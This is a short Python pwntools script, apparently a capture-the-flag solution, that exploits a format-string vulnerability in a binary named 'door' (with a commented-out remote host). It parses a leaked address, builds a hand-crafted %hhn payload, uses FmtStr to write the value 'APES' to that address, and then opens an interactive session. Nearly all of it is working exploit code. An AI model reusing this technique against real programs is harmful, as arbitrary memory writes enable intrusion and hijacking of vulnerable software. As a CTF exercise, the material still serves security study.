from pwn import *

context.terminal = ["tmux", "splitw", "-h"]

p = process("./door")
# p = remote("plzpwn.me","4000")
p.recvuntil("at ")
ad = int(p.recv(10), 16)
log.info(hex(ad))


f = (".%s%s%s%s."
        "%%1$046x."
        "%%2$hhn."
        "%%1$269x."
        "%%3$hhn."
        "%%1$243x."
        "%%4$hhn." 
        "%%1$012x."
        "%%5$hhn." %
        (p32(ad), p32(ad+1), p32(ad+2), p32(ad+3)))
print repr(f)
p.recv()
# form = FmtStr(execute_fmt=p.sendline, offset=2)
def pay(q):
    p.sendline(q)
    log.info(repr(q))
    print repr(q)
pause()
form = FmtStr(execute_fmt=pay, offset=2, padlen=1)
form.write(ad, u32("APES"))
# print hex(u32("APES"))
form.execute_writes()
# p.sendline("." + fmtstr_payload(2, {ad: u32("APES")},numbwritten=1))
print p.recv()
p.interactive()


